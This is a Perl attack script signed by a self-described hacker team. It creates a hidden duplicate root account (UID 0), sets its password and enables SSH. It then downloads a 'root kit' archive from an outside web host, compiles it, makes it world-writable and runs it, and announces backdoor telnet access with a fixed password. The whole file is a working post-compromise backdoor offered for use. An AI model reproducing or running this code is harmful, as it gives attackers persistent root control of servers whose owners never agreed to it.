#!/usr/bin/perl -w
#C0de By JaBrOt HaCkEr :)
#Email : v7_@hoTmail.cOm
#L&J TeaM
#Greetz To : HaCkEr KsA & LeGeNd HaCkEr
# and all HaCkEr Muslims
#File p3rl add user root
#and Activate Account Ssh
#and Installing root Kate


print"############################################\n";
print"#          By    JaBrOt HaCkEr             #\n";
print"#                  L&J TeaM                #\n";
print"#          Creativity without borders      #\n";
print"#          File p3rl add user root         #\n";
print"#          and Activate Account Ssh        #\n";
print"#            Installing root Kate          #\n";
print"#                 Greetz To                #\n";
print"#       HaCkEr KsA   and  LeGeNd HaCkEr    #\n";
print"############################################\n";

################################################

if(@ARGV !=1){
print " perl $0 <user root new> \n";
exit;
}
($name) = @ARGV;
system "/usr/sbin/useradd -o -u 0 $name";

################################################

if(@ARGV !=1){
print "  <user root> \n";
exit;
}
($pass) = @ARGV;
system "passwd $pass";

#################################################
print"##########################################\n";
print " now Activate Account Ssh :)\n";
system "/etc/rc.d/init.d/sshd start";

print"##########################################\n";

system"#UseDNS no";
system"/etc/rc.d/init.d/sshd restart";
print"##########################################\n";
##################################################
print"##########################################\n";

################################################

print "Installing root Kate [y]es ";

system "wget http://www.zf-inc.com/images/ro0t.zip\n";
system"unzip ro0t.zip\n";
system"gcc ro0t.c -o jabrot\n";
system"chmod 777 jabrot\n";
system"./jabrot\n";
print"#\n";
print"Contact now Telnet\n";
print"#\n";
print"pass: 0wned\n";
print"#\n";
##################################################

print " Everything is available now from the ssh Contact\n";

print"#\n";

print "#sEe y0u#\n";

################################################### 